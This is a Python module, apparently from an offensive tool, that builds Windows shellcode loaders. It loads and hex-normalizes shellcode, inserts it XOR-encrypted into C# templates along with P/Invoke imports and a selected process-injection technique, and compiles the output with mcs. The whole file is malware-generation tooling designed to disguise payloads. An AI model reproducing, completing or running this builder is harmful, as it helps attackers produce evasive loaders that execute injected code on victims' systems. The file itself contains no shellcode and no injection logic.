import re
import subprocess
from lib.init import *
from lib.args import *

script_path = os.path.dirname(os.path.abspath(__file__))

def normalize_shellcode_text(text):
    cleaned = re.sub(r'[^0-9a-fA-FxX,\s]', '', text)
    cleaned = cleaned.replace("0x", "").replace("0X", "")
    cleaned = "".join(cleaned.split()).replace(",", "")

    if cleaned and all(ch in "0123456789abcdefABCDEF" for ch in cleaned):
        return cleaned.lower()

    return None

def load_shellcode_from_file(path):
    with open(path, "rb") as handle:
        data = handle.read()

    if not data:
        raise ValueError("shellcode file is empty")

    try:
        text = data.decode("utf-8").strip()
    except UnicodeDecodeError:
        return "".join(f"{b:02x}" for b in data)

    normalized = normalize_shellcode_text(text)
    if normalized is not None:
        return normalized

    return "".join(f"{b:02x}" for b in data)

def choose_shellcode(custom):
    if getattr(args, "shellcode_file", None):
        return load_shellcode_from_file(args.shellcode_file)

    if custom:
        return args.shellcode

# create csharp file based on input from template
def generate_cs_file(binary, encrypted, injection_technique):
    with open(f"{script_path}/../cs_templates/{binary}.cs","r") as file:
        template = file.read()
        template = template.replace('{encrypted_shellcode}', encrypted['blob'])
        template = template.replace('{xor_key}', encrypted['key'])
        template = template.replace('{pinvoke_code}', injection_list['injection_techniques'][f'{injection_technique}']['pinvoke_imports'])
        template = template.replace('{injection_logic}', injection_list['injection_techniques'][f'{injection_technique}']['code'])

    with open(os.path.join(os.getcwd(), f"{binary}.cs"), "w") as file:
        file.write(template)

# compile csharp file using mcs
def mcs_compile(command):
    op = subprocess.run(command.split(), capture_output=True)
    if op.returncode != 0:
        print(Fore.RED + Style.BRIGHT + "[!] MCS Execution Error")
        print(Fore.RED + op.stderr.decode())
        exit()
    else:
        return True